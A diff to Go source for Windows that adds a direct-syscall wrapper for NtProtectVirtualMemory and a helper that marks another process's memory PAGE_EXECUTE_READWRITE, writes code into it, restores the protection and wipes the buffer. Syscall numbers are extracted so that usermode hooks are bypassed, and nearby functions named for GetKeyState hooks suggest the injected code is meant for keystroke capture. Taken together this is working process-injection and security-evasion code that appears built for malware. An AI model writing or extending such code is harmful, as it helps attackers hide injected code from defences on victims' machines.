@@ -13,11 +13,12 @@ import (
 )
 
 var (
-	ntdll                    = windows.NewLazySystemDLL("ntdll.dll")
-	procNtWriteVirtualMemory = ntdll.NewProc("NtWriteVirtualMemory")
-	procNtReadVirtualMemory  = ntdll.NewProc("NtReadVirtualMemory")
-	procNtOpenProcess        = ntdll.NewProc("NtOpenProcess")
-	procNtClose              = ntdll.NewProc("NtClose")
+	ntdll                      = windows.NewLazySystemDLL("ntdll.dll")
+	procNtWriteVirtualMemory   = ntdll.NewProc("NtWriteVirtualMemory")
+	procNtReadVirtualMemory    = ntdll.NewProc("NtReadVirtualMemory")
+	procNtOpenProcess          = ntdll.NewProc("NtOpenProcess")
+	procNtClose                = ntdll.NewProc("NtClose")
+	procNtProtectVirtualMemory = ntdll.NewProc("NtProtectVirtualMemory")
 )
 
 const scLen = 11
@@ -27,10 +28,11 @@ type scProc struct {
 }
 
 var (
-	scWrite scProc
-	scRead  scProc
-	scOpen  scProc
-	scClose scProc
+	scWrite   scProc
+	scRead    scProc
+	scOpen    scProc
+	scClose   scProc
+	scProtect scProc
 
 	scOnce sync.Once
 	scErr  error
@@ -46,6 +48,7 @@ func scInit() error {
 			{"NtReadVirtualMemory", &scRead},
 			{"NtOpenProcess", &scOpen},
 			{"NtClose", &scClose},
+			{"NtProtectVirtualMemory", &scProtect},
 		}
 		for _, e := range entries {
 			ssn, ok := extractNtSSN(e.name)
@@ -437,8 +440,53 @@ func polyGetKeyStateHookPerCall(key byte) []byte {
 	}
 }
 
+func ntProtectMemory(handle windows.Handle, addr uintptr, size uintptr, newProtect uint32) (uint32, error) {
+	baseAddr := addr
+	regionSize := size
+	var oldProtect uint32
+
+	if scInit() == nil {
+		r, _, _ := syscall.SyscallN(scProtect.addr,
+			uintptr(handle),
+			uintptr(unsafe.Pointer(&baseAddr)),
+			uintptr(unsafe.Pointer(&regionSize)),
+			uintptr(newProtect),
+			uintptr(unsafe.Pointer(&oldProtect)),
+		)
+		if r != 0 {
+			return 0, fmt.Errorf("protect: 0x%08X", r)
+		}
+		return oldProtect, nil
+	}
+
+	if err := procNtProtectVirtualMemory.Find(); err != nil {
+		return 0, fmt.Errorf("protect: unavailable: %w", err)
+	}
+	r, _, _ := procNtProtectVirtualMemory.Call(
+		uintptr(handle),
+		uintptr(unsafe.Pointer(&baseAddr)),
+		uintptr(unsafe.Pointer(&regionSize)),
+		uintptr(newProtect),
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+	if r != 0 {
+		return 0, fmt.Errorf("protect: 0x%08X", r)
+	}
+	return oldProtect, nil
+}
+
+func ntWriteCode(handle windows.Handle, addr uintptr, buf *byte, size uintptr) error {
+	oldProt, err := ntProtectMemory(handle, addr, size, windows.PAGE_EXECUTE_READWRITE)
+	if err != nil {
+		return fmt.Errorf("pre-write %w", err)
+	}
+	err = ntWriteMemory(handle, addr, buf, size)
+	_, _ = ntProtectMemory(handle, addr, size, oldProt)
+	return err
+}
+
 func writeAndClean(handle windows.Handle, addr uintptr, code []byte) error {
-	err := ntWriteMemory(handle, addr, &code[0], uintptr(len(code)))
+	err := ntWriteCode(handle, addr, &code[0], uintptr(len(code)))
 	secureZero(code)
 	return err
 }
